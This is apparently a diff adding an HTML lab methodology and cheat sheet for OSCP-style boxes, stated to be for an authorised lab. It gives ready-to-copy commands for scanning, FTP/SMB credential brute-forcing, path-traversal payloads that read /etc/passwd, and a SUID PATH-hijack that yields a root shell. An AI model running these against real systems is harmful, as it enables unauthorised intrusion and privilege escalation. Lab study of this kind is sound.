+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>curl<span class="w"> </span>-s<span class="w"> </span>-i<span class="w"> </span>http://<span class="nv">$TARGET</span>/<span class="w"> </span><span class="p">|</span><span class="w"> </span>head<span class="w"> </span>-20<span class="w">          </span><span class="c1"># stock page? framework? redirect?</span>
+<span class="k">for</span><span class="w"> </span>p<span class="w"> </span><span class="k">in</span><span class="w"> </span>robots.txt<span class="w"> </span>sitemap.xml<span class="w"> </span>.git/<span class="w"> </span>.htaccess<span class="w"> </span>server-status<span class="p">;</span><span class="w"> </span><span class="k">do</span>
+<span class="w">  </span>curl<span class="w"> </span>-s<span class="w"> </span>-o<span class="w"> </span>/dev/null<span class="w"> </span>-w<span class="w"> </span><span class="s2">&quot;%{http_code} %{size_download}  /</span><span class="nv">$p</span><span class="s2">\n&quot;</span><span class="w"> </span>http://<span class="nv">$TARGET</span>/<span class="nv">$p</span>
+<span class="k">done</span>
+feroxbuster<span class="w"> </span>-u<span class="w"> </span>http://<span class="nv">$TARGET</span><span class="w"> </span>-w<span class="w"> </span>/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-t<span class="w"> </span><span class="m">40</span><span class="w"> </span>-d<span class="w"> </span><span class="m">2</span><span class="w"> </span>--smart<span class="w"> </span>--no-state<span class="w"> </span>-q
+</pre></div>
+<ul>
+<li>Note the <strong>404 body size</strong> — it is your filter for everything after.</li>
+<li>Vhosts: <code>ffuf -u http://$TARGET/ -H "Host: FUZZ" -w &lt;subdomains&gt; -fr "&lt;default page text&gt;"</code>.</li>
+<li>Timebox it. If the page is byte-identical to a stock install and two wordlists agree, stop.</li>
+</ul>
+<h4>FTP</h4>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>ftp<span class="w"> </span>-n<span class="w"> </span>-v<span class="w"> </span><span class="nv">$TARGET</span><span class="w"> </span><span class="o">&lt;&lt;&lt;</span><span class="w"> </span><span class="s1">$&#39;user anonymous anon@test\nls\nbye&#39;</span><span class="w">   </span><span class="c1"># 530 on USER = anonymous_enable=NO</span>
+hydra<span class="w"> </span>-L<span class="w"> </span>users.txt<span class="w"> </span>-P<span class="w"> </span>pass.txt<span class="w"> </span>-t<span class="w"> </span><span class="m">4</span><span class="w"> </span>-f<span class="w"> </span>ftp://<span class="nv">$TARGET</span>
+</pre></div>
+<p>Try the account name as the password. Check for key material, configs, and backups in the data
+directory — a shared <code>/srv/ftp</code> often leaks a <em>different</em> account's secrets.</p>
+<h4>SSH</h4>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>ssh<span class="w"> </span>-i<span class="w"> </span>key<span class="w"> </span>-o<span class="w"> </span><span class="nv">BatchMode</span><span class="o">=</span>yes<span class="w"> </span>user@<span class="nv">$TARGET</span><span class="w"> </span>id<span class="w">      </span><span class="c1"># never point a key at a host without -o BatchMode</span>
+ssh-keygen<span class="w"> </span>-l<span class="w"> </span>-f<span class="w"> </span>key<span class="w">                             </span>#<span class="w"> </span><span class="nb">read</span><span class="w"> </span>the<span class="w"> </span>comment<span class="w"> </span>first:<span class="w"> </span>it<span class="w"> </span>names<span class="w"> </span>the<span class="w"> </span>user
+</pre></div>
+<h4>SMB</h4>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$TARGET</span><span class="w"> </span>-u<span class="w"> </span><span class="s1">&#39;&#39;</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;&#39;</span><span class="w"> </span>--shares
+nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$TARGET</span><span class="w"> </span>-u<span class="w"> </span>guest<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;&#39;</span><span class="w"> </span>--shares
+nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$TARGET</span><span class="w"> </span>-u<span class="w"> </span>user<span class="w"> </span>-p<span class="w"> </span>pass<span class="w"> </span>-d<span class="w"> </span>DOMAIN<span class="w"> </span>--shares
+</pre></div>
+<hr />
+<h3>Phase 4 — Foothold</h3>
+<p>Get a shell, then <strong>immediately</strong> stabilise and record identity:</p>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>id<span class="p">;</span><span class="w"> </span>hostname<span class="p">;</span><span class="w"> </span>sudo<span class="w"> </span>-n<span class="w"> </span>-l<span class="p">;</span><span class="w"> </span>uname<span class="w"> </span>-a
+</pre></div>
+<p>Do not start hunting for privesc before you know exactly which uid and groups you hold — the
+escalation path depends on it.</p>
+<hr />
+<h3>Phase 5 — Local enumeration (Linux)</h3>
+<p>Send one script over one connection and read one report:</p>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>ssh<span class="w"> </span>user@<span class="nv">$TARGET</span><span class="w"> </span><span class="s1">&#39;bash -s&#39;</span><span class="w"> </span>&lt;<span class="w"> </span>enum.sh
+</pre></div>
+<p>Checklist, in the order that finds things:</p>
+<table>
+<thead>
+<tr>
+<th>#</th>
+<th>Check</th>
+<th>Command</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1</td>
+<td>sudo rights</td>
+<td><code>sudo -n -l</code></td>
+</tr>
+<tr>
+<td>2</td>
+<td>SUID, excluding snap noise</td>
+<td><code>find / -perm -4000 -type f 2&gt;/dev/null \| grep -v '^/snap'</code></td>
+</tr>
+<tr>
+<td>3</td>
+<td>Capabilities</td>
+<td><code>getcap -r / 2&gt;/dev/null</code></td>
+</tr>
+<tr>
+<td>4</td>
+<td>Cron</td>
+<td><code>cat /etc/crontab; ls -la /etc/cron.*</code></td>
+</tr>
+<tr>
+<td>5</td>
+<td>Writable service files</td>
+<td><code>find / -writable -type f -path '*/etc/*' 2&gt;/dev/null</code></td>
+</tr>
+<tr>
+<td>6</td>
+<td>Listening sockets</td>
+<td><code>ss -tlnp</code></td>
+</tr>
+<tr>
+<td>7</td>
+<td>Home directories</td>
+<td><code>ls -la /home/*</code> — this box had the SUID helper in a user's home</td>
+</tr>
+<tr>
+<td>8</td>
+<td>History and keys</td>
+<td><code>ls -la ~/.ssh; cat ~/.bash_history</code></td>
+</tr>
+<tr>
+<td>9</td>
+<td>Kernel</td>
+<td><code>uname -a</code> — only if 1–8 are empty</td>
+</tr>
+<tr>
+<td>10</td>
+<td>Password reuse</td>
+<td>the foothold password against <code>sudo -S</code> and other users</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Rule:</strong> a <em>custom</em> SUID binary beats every generic exploit. Read it before reaching for
+<code>linpeas</code> output tables.</p>
+<hr />
+<h3>Phase 6 — Binary analysis (when a SUID binary looks custom)</h3>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>file<span class="w"> </span>/path/binary<span class="w">                    </span><span class="c1"># not stripped? then function names survive</span>
+strings<span class="w"> </span>-a<span class="w"> </span>/path/binary<span class="w"> </span><span class="p">|</span><span class="w"> </span>head<span class="w"> </span>-40<span class="w">   </span><span class="c1"># look for system, popen, exec*, and bare command names</span>
+objdump<span class="w"> </span>-d<span class="w"> </span>-M<span class="w"> </span>intel<span class="w"> </span>/path/binary<span class="w"> </span><span class="p">|</span><span class="w"> </span>sed<span class="w"> </span>-n<span class="w"> </span><span class="s1">&#39;/&lt;main&gt;:/,/^$/p&#39;</span>
+readelf<span class="w"> </span>-d<span class="w"> </span>/path/binary<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-E<span class="w"> </span><span class="s1">&#39;BIND_NOW|FLAGS&#39;</span><span class="w">   </span>#<span class="w"> </span>is<span class="w"> </span>RELRO<span class="w"> </span>full?<span class="w"> </span><span class="o">(</span>memory<span class="w"> </span>bugs<span class="w"> </span>are<span class="w"> </span><span class="k">then</span><span class="w"> </span>out<span class="o">)</span>
+</pre></div>
+<p>What you are looking for, in priority order:</p>
+<ol>
+<li><code>system()</code> / <code>popen()</code> with a <strong>bare command name</strong> → <code>PATH</code> hijack (CWE-426)</li>
+<li><code>setuid(0)</code>/<code>seteuid(0)</code> <strong>before</strong> that call → the shell will not drop privileges → full root</li>
+<li>A writable path used by root → symlink or overwrite attack</li>
+<li>A shell escape in a pager/editor it invokes</li>
+</ol>
+<p>If the binary is setuid <strong>and</strong> setgid, or lives in a user-writable directory, the box author is
+telling you this is the path.</p>
+<hr />
+<h3>Phase 7 — Post-exploitation and reporting</h3>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>cat<span class="w"> </span>/root/proof.txt<span class="p">;</span><span class="w"> </span>cat<span class="w"> </span>/home/*/local.txt
+ip<span class="w"> </span>a<span class="p">;</span><span class="w"> </span>ip<span class="w"> </span>r<span class="w">          </span>#<span class="w"> </span>can<span class="w"> </span>this<span class="w"> </span>host<span class="w"> </span>pivot?<span class="w"> </span><span class="o">(</span>single<span class="w"> </span>NIC<span class="w"> </span>+<span class="w"> </span>default<span class="w"> </span><span class="nv">route</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>no<span class="o">)</span>
+</pre></div>
+<p>Record: exact flags, the <code>id</code> output as root, the mechanism in one paragraph, and every command
+with its output. Then clean up.</p>
+<h4>Cleanup checklist</h4>
+<ul>
+<li>Remove every file you created, then <strong>verify</strong> with <code>ls</code>.</li>
+<li>Revert any file you modified.</li>
+<li>Do not change credentials you do not own; if an exploit would have (this box's <code>chpasswd</code>),
+  note that it did not run.</li>
+<li>Note in the report what you changed and what you left alone.</li>
+</ul>
+<hr />
+<h3>Timeboxing heuristics</h3>
+<table>
+<thead>
+<tr>
+<th>Situation</th>
+<th>Budget</th>
+<th>Move on when</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Web on a stock default page</td>
+<td>10 min</td>
+<td>Two wordlists + vhosts agree there is nothing</td>
+</tr>
+<tr>
+<td>Version-CVE rabbit hole</td>
+<td>5 min</td>
+<td>The package revision shows the backport</td>
+</tr>
+<tr>
+<td>Credential guessing</td>
+<td>5 min per service</td>
+<td>Account-specific defaults exhausted</td>
+</tr>
+<tr>
+<td>Generic privesc sweep</td>
+<td>15 min</td>
+<td>A custom SUID/service/cron finding exists</td>
+</tr>
+</tbody>
+</table>
+<p>The recurring lesson: <strong>spend the time on the surface you have not looked at, not on the one you
+have already disproved.</strong> On this box, thirty UDP ports were worth more than an hour of web.</p></div></section>
+<section class="chapter" id="ch-09" data-title="Cheat sheet"><div class="ch-head"><span class="ch-num">09</span><div class="ch-title"><h2>Cheat sheet</h2><p class="ch-sub">Every command, with the flag that matters</p></div><button class="ghost copyall" type="button">Copy commands</button></div><div class="content"><p>Only commands I have actually needed, with the small flag that matters each time.</p>
+<hr />
+<h3>Scanning</h3>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="c1">## full TCP, fast — always -p-</span>
+nmap<span class="w"> </span>-p-<span class="w"> </span>--min-rate<span class="w"> </span><span class="m">3000</span><span class="w"> </span>-T4<span class="w"> </span>-oN<span class="w"> </span>full_tcp.txt<span class="w"> </span><span class="nv">$T</span>
+
+<span class="c1">## versions + default scripts on the ports that matter</span>
+nmap<span class="w"> </span>-sV<span class="w"> </span>-sC<span class="w"> </span>-p21,22,80<span class="w"> </span>-oN<span class="w"> </span>services.txt<span class="w"> </span><span class="nv">$T</span>
+
+<span class="c1">## UDP: the phase everyone skips</span>
+nmap<span class="w"> </span>-sU<span class="w"> </span>--top-ports<span class="w"> </span><span class="m">30</span><span class="w"> </span>-T4<span class="w"> </span>--max-retries<span class="w"> </span><span class="m">1</span><span class="w"> </span>--host-timeout<span class="w"> </span>180s<span class="w"> </span><span class="nv">$T</span>
+
+<span class="c1">## live hosts</span>
+nmap<span class="w"> </span>-sn<span class="w"> </span><span class="m">192</span>.168.245.0/24<span class="w"> </span>-oG<span class="w"> </span>-<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-i<span class="w"> </span>up<span class="w"> </span><span class="p">|</span><span class="w"> </span>awk<span class="w"> </span><span class="s1">&#39;{print $2}&#39;</span>
+</pre></div>
+<hr />
+<h3>SNMP</h3>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="c1">## find the community string</span>
+<span class="k">for</span><span class="w"> </span>c<span class="w"> </span><span class="k">in</span><span class="w"> </span>public<span class="w"> </span>private<span class="w"> </span>manager<span class="w"> </span>internal<span class="p">;</span><span class="w"> </span><span class="k">do</span>
+<span class="w">  </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;== </span><span class="nv">$c</span><span class="s2">&quot;</span><span class="p">;</span><span class="w"> </span>snmpwalk<span class="w"> </span>-v1<span class="w"> </span>-c<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$c</span><span class="s2">&quot;</span><span class="w"> </span>-t<span class="w"> </span><span class="m">5</span><span class="w"> </span>-r<span class="w"> </span><span class="m">1</span><span class="w"> </span><span class="nv">$T</span><span class="w"> </span><span class="m">1</span>.3.6.1.2.1.1<span class="w"> </span><span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>head<span class="w"> </span>-3
+<span class="k">done</span>
+
+<span class="c1">## full walk to a file, then grep it</span>
+snmpwalk<span class="w"> </span>-v1<span class="w"> </span>-c<span class="w"> </span>public<span class="w"> </span>-t<span class="w"> </span><span class="m">5</span><span class="w"> </span>-r<span class="w"> </span><span class="m">1</span><span class="w"> </span><span class="nv">$T</span><span class="w"> </span>&gt;<span class="w"> </span>snmp_full.txt
+
+<span class="c1">## the three trees that matter on Linux</span>
+snmpwalk<span class="w"> </span>-v1<span class="w"> </span>-c<span class="w"> </span>public<span class="w"> </span><span class="nv">$T</span><span class="w"> </span><span class="m">1</span>.3.6.1.4.1.8072.1.3.2<span class="w">    </span><span class="c1"># nsExtendTable (commands + descriptions)</span>
+snmpwalk<span class="w"> </span>-v1<span class="w"> </span>-c<span class="w"> </span>public<span class="w"> </span><span class="nv">$T</span><span class="w"> </span><span class="m">1</span>.3.6.1.2.1.25.4.2.1.2<span class="w">    </span><span class="c1"># process names</span>
+snmpwalk<span class="w"> </span>-v1<span class="w"> </span>-c<span class="w"> </span>public<span class="w"> </span><span class="nv">$T</span><span class="w"> </span><span class="m">1</span>.3.6.1.2.1.25.6.3.1.2<span class="w">    </span><span class="c1"># installed packages</span>
+snmpwalk<span class="w"> </span>-v1<span class="w"> </span>-c<span class="w"> </span>public<span class="w"> </span><span class="nv">$T</span><span class="w"> </span><span class="m">1</span>.3.6.1.2.1.4.20.1.1<span class="w">      </span><span class="c1"># interface IPs</span>
+
+<span class="c1">## decode an nsExtendTable index suffix (5.82.69.83.69.84 -&gt; RESET)</span>
+python3<span class="w"> </span>-c<span class="w"> </span><span class="s2">&quot;s=&#39;82.69.83.69.84&#39;.split(&#39;.&#39;); print(&#39;&#39;.join(chr(int(x)) for x in s[1:]))&quot;</span>
+
+<span class="c1">## bulk walk when v1 is slow</span>
+snmpbulkwalk<span class="w"> </span>-v2c<span class="w"> </span>-c<span class="w"> </span>public<span class="w"> </span><span class="nv">$T</span><span class="w"> </span><span class="m">1</span>.3.6.1.4.1.8072.1.3.2
+</pre></div>
+<hr />
+<h3>Web</h3>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>curl<span class="w"> </span>-s<span class="w"> </span>-i<span class="w"> </span>http://<span class="nv">$T</span>/<span class="w"> </span><span class="p">|</span><span class="w"> </span>head<span class="w"> </span>-20
+curl<span class="w"> </span>-s<span class="w"> </span>-o<span class="w"> </span>/dev/null<span class="w"> </span>-w<span class="w"> </span><span class="s2">&quot;%{http_code} %{size_download}\n&quot;</span><span class="w"> </span>http://<span class="nv">$T</span>/robots.txt
+
+<span class="c1">## path traversal tests — --path-as-is is mandatory or curl normalises the payload</span>
+curl<span class="w"> </span>-s<span class="w"> </span>--path-as-is<span class="w"> </span><span class="s2">&quot;http://</span><span class="nv">$T</span><span class="s2">/icons/.%2e/.%2e/.%2e/.%2e/etc/passwd&quot;</span>
+curl<span class="w"> </span>-s<span class="w"> </span>--path-as-is<span class="w"> </span><span class="s2">&quot;http://</span><span class="nv">$T</span><span class="s2">/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/etc/passwd&quot;</span>
+
+feroxbuster<span class="w"> </span>-u<span class="w"> </span>http://<span class="nv">$T</span><span class="w"> </span>-w<span class="w"> </span>/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-t<span class="w"> </span><span class="m">40</span><span class="w"> </span>-d<span class="w"> </span><span class="m">2</span><span class="w"> </span>--smart<span class="w"> </span>--no-state<span class="w"> </span>-q
+
+ffuf<span class="w"> </span>-u<span class="w"> </span>http://<span class="nv">$T</span>/<span class="w"> </span>-H<span class="w"> </span><span class="s2">&quot;Host: FUZZ&quot;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-w<span class="w"> </span>/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-mc<span class="w"> </span>all<span class="w"> </span>-fr<span class="w"> </span><span class="s2">&quot;Apache2 Ubuntu Default Page&quot;</span><span class="w"> </span>-t<span class="w"> </span><span class="m">40</span><span class="w"> </span>-s
+</pre></div>
+<hr />
+<h3>FTP</h3>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>ftp<span class="w"> </span>-n<span class="w"> </span>-v<span class="w"> </span><span class="nv">$T</span><span class="w"> </span><span class="o">&lt;&lt;&lt;</span><span class="w"> </span><span class="s1">$&#39;user anonymous anon@test\nls\nbye&#39;</span><span class="w">    </span><span class="c1"># 530 right after USER =&gt; anonymous off</span>
+
+hydra<span class="w"> </span>-L<span class="w"> </span>users.txt<span class="w"> </span>-P<span class="w"> </span>pass.txt<span class="w"> </span>-t<span class="w"> </span><span class="m">4</span><span class="w"> </span>-f<span class="w"> </span>-V<span class="w"> </span>ftp://<span class="nv">$T</span><span class="w">       </span><span class="c1"># -t 4 keeps vsftpd happy</span>
+
+curl<span class="w"> </span>-s<span class="w"> </span>-u<span class="w"> </span>user:pass<span class="w"> </span><span class="s2">&quot;ftp://</span><span class="nv">$T</span><span class="s2">/&quot;</span><span class="w">                         </span><span class="c1"># list</span>
+curl<span class="w"> </span>-s<span class="w"> </span>-u<span class="w"> </span>user:pass<span class="w"> </span>-o<span class="w"> </span>file<span class="w"> </span><span class="s2">&quot;ftp://</span><span class="nv">$T</span><span class="s2">/file&quot;</span><span class="w">             </span>#<span class="w"> </span>download
+</pre></div>
+<hr />
+<h3>SSH</h3>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>ssh-keygen<span class="w"> </span>-l<span class="w"> </span>-f<span class="w"> </span>id_rsa<span class="w">                                  </span><span class="c1"># comment names the user</span>
+
+<span class="c1">## BatchMode=yes so it never hangs on a password prompt</span>
+ssh<span class="w"> </span>-i<span class="w"> </span>id_rsa<span class="w"> </span>-o<span class="w"> </span><span class="nv">BatchMode</span><span class="o">=</span>yes<span class="w"> </span>-o<span class="w"> </span><span class="nv">StrictHostKeyChecking</span><span class="o">=</span>no<span class="w"> </span>user@<span class="nv">$T</span><span class="w"> </span>id
+
+sshpass<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;pass&#39;</span><span class="w"> </span>ssh<span class="w"> </span>-o<span class="w"> </span><span class="nv">PreferredAuthentications</span><span class="o">=</span>password<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-o<span class="w"> </span><span class="nv">PubkeyAuthentication</span><span class="o">=</span>no<span class="w"> </span>user@<span class="nv">$T</span><span class="w"> </span>id
+
+<span class="c1">## run a whole enumeration script in one connection</span>
+ssh<span class="w"> </span>-i<span class="w"> </span>id_rsa<span class="w"> </span>user@<span class="nv">$T</span><span class="w"> </span><span class="s1">&#39;bash -s&#39;</span><span class="w"> </span>&lt;<span class="w"> </span>enum.sh
+</pre></div>
+<hr />
+<h3>SMB</h3>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$T</span><span class="w"> </span>-u<span class="w"> </span><span class="s1">&#39;&#39;</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;&#39;</span><span class="w"> </span>--shares
+nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$T</span><span class="w"> </span>-u<span class="w"> </span>guest<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;&#39;</span><span class="w"> </span>--shares
+nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$T</span><span class="w"> </span>-u<span class="w"> </span>user<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;pass&#39;</span><span class="w"> </span>-d<span class="w"> </span>DOMAIN<span class="w"> </span>--shares
+
+smbclient<span class="w"> </span>//<span class="nv">$T</span>/share<span class="w"> </span>-U<span class="w"> </span><span class="s1">&#39;DOMAIN/user%pass&#39;</span><span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;recurse; ls&#39;</span>
+smbclient<span class="w"> </span>//<span class="nv">$T</span>/share<span class="w"> </span>-U<span class="w"> </span><span class="s1">&#39;DOMAIN/user%pass&#39;</span><span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;get file.txt&#39;</span>
+</pre></div>
+<hr />
+<h3>Linux local enumeration</h3>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>id<span class="p">;</span><span class="w"> </span>hostname<span class="p">;</span><span class="w"> </span>sudo<span class="w"> </span>-n<span class="w"> </span>-l<span class="p">;</span><span class="w"> </span>uname<span class="w"> </span>-a
+
+<span class="c1">## SUID without tripling the output on snap</span>
+find<span class="w"> </span>/<span class="w"> </span>-perm<span class="w"> </span>-4000<span class="w"> </span>-type<span class="w"> </span>f<span class="w"> </span><span class="m">2</span>&gt;/dev/null<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-v<span class="w"> </span><span class="s1">&#39;^/snap&#39;</span>
+
+find<span class="w"> </span>/<span class="w"> </span>-perm<span class="w"> </span>-2000<span class="w"> </span>-type<span class="w"> </span>f<span class="w"> </span><span class="m">2</span>&gt;/dev/null<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-v<span class="w"> </span><span class="s1">&#39;^/snap&#39;</span><span class="w">    </span><span class="c1"># setgid</span>
+getcap<span class="w"> </span>-r<span class="w"> </span>/<span class="w"> </span><span class="m">2</span>&gt;/dev/null
+cat<span class="w"> </span>/etc/crontab<span class="p">;</span><span class="w"> </span>ls<span class="w"> </span>-la<span class="w"> </span>/etc/cron.*
+ss<span class="w"> </span>-tlnp
+ls<span class="w"> </span>-la<span class="w"> </span>/home/*<span class="w"> </span>/opt<span class="w"> </span>/srv<span class="w"> </span>/var/www
+find<span class="w"> </span>/<span class="w"> </span>-name<span class="w"> </span>local.txt<span class="w"> </span>-o<span class="w"> </span>-name<span class="w"> </span>proof.txt<span class="w"> </span><span class="m">2</span>&gt;/dev/null
+</pre></div>
+<hr />
+<h3>Binary analysis</h3>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>file<span class="w"> </span>bin<span class="w">                                  </span><span class="c1"># &quot;not stripped&quot; = function names survive</span>
+strings<span class="w"> </span>-a<span class="w"> </span>bin<span class="w"> </span><span class="p">|</span><span class="w"> </span>head<span class="w"> </span>-40<span class="w">                 </span><span class="c1"># system / popen / exec / bare command names</span>
+objdump<span class="w"> </span>-d<span class="w"> </span>-M<span class="w"> </span>intel<span class="w"> </span>bin<span class="w"> </span><span class="p">|</span><span class="w"> </span>sed<span class="w"> </span>-n<span class="w"> </span><span class="s1">&#39;/&lt;main&gt;:/,/^$/p&#39;</span>
+readelf<span class="w"> </span>-d<span class="w"> </span>bin<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-E<span class="w"> </span><span class="s1">&#39;BIND_NOW|FLAGS&#39;</span><span class="w"> </span><span class="c1"># full RELRO =&gt; forget GOT overwrite</span>
+objdump<span class="w"> </span>-s<span class="w"> </span>-j<span class="w"> </span>.rodata<span class="w"> </span>bin<span class="w"> </span><span class="p">|</span><span class="w"> </span>head<span class="w">          </span>#<span class="w"> </span>resolve<span class="w"> </span>the<span class="w"> </span>strings<span class="w"> </span>passed<span class="w"> </span>to<span class="w"> </span>system<span class="o">()</span>
+</pre></div>
+<p>Reconstructing source from a small binary:</p>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">+ setuid / setgid  →  setuid(0); setgid(0);
++ lea rdi,[rip+...] →  the argument is a fixed string
++ call system@plt  →  system("...")</span></pre></div>
+<hr />
+<h3>Privesc — PATH hijack template</h3>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="nv">D</span><span class="o">=</span><span class="k">$(</span>mktemp<span class="w"> </span>-d<span class="w"> </span>/tmp/x.XXXXXX<span class="k">)</span>
+cat<span class="w"> </span>&gt;<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$D</span><span class="s2">/chpasswd&quot;</span><span class="w"> </span><span class="s">&lt;&lt;&#39;EOF&#39;</span>
+<span class="s">#!/bin/bash</span>
+<span class="s">id &gt; /tmp/root_id.txt</span>
+<span class="s">cat /root/proof.txt &gt; /tmp/root_proof.txt 2&gt;&amp;1</span>
+<span class="s">chmod 644 /tmp/root_id.txt /tmp/root_proof.txt</span>
+<span class="s">EOF</span>
+chmod<span class="w"> </span>+x<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$D</span><span class="s2">/chpasswd&quot;</span>
+
+<span class="c1">## name the faked binary exactly as the SUID program invokes it</span>
+<span class="nv">PATH</span><span class="o">=</span><span class="s2">&quot;</span><span class="nv">$D</span><span class="s2">:</span><span class="nv">$PATH</span><span class="s2">&quot;</span><span class="w"> </span>/path/to/suid_binary
+
+cat<span class="w"> </span>/tmp/root_id.txt
+</pre></div>
+<p>Works only when the SUID binary calls <code>setuid(0)</code>/<code>seteuid(0)</code> <strong>before</strong> <code>system()</code>. If it does
+not, the shell drops privileges and the payload runs as you. Check the disassembly order first.</p>
+<p>Interactive variant:</p>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="nb">printf</span><span class="w"> </span><span class="s1">&#39;#!/bin/bash\n/bin/bash -p\n&#39;</span><span class="w"> </span>&gt;<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$D</span><span class="s2">/chpasswd&quot;</span><span class="p">;</span><span class="w"> </span>chmod<span class="w"> </span>+x<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$D</span><span class="s2">/chpasswd&quot;</span>
+<span class="nv">PATH</span><span class="o">=</span><span class="s2">&quot;</span><span class="nv">$D</span><span class="s2">:</span><span class="nv">$PATH</span><span class="s2">&quot;</span><span class="w"> </span>/path/to/suid_binary
+</pre></div>
+<hr />
+<h3>Cleanup</h3>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="nv">D</span><span class="o">=</span><span class="k">$(</span>mktemp<span class="w"> </span>-d<span class="w"> </span>/tmp/c.XXXXXX<span class="k">)</span>
+<span class="nb">printf</span><span class="w"> </span><span class="s1">&#39;#!/bin/bash\nrm -f /tmp/root_id.txt /tmp/root_proof.txt; rm -rf /tmp/x.*\n&#39;</span><span class="w"> </span>&gt;<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$D</span><span class="s2">/chpasswd&quot;</span>
+chmod<span class="w"> </span>+x<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$D</span><span class="s2">/chpasswd&quot;</span>
+<span class="nv">PATH</span><span class="o">=</span><span class="s2">&quot;</span><span class="nv">$D</span><span class="s2">:</span><span class="nv">$PATH</span><span class="s2">&quot;</span><span class="w"> </span>/path/to/suid_binary
+ls<span class="w"> </span>-la<span class="w"> </span>/tmp/root_id.txt<span class="w">        </span>#<span class="w"> </span>must<span class="w"> </span>be<span class="w"> </span><span class="s2">&quot;No such file or directory&quot;</span>
+</pre></div></div></section>
+
+    <footer>
+      <span>Authorised lab environment · flags and credentials are lab-specific</span>
+      <span><a href="https://github.com/AV10V/OSCP">source on GitHub</a> · built 14 November 2026</span>
+    </footer>
+  </main>
+</div>
+
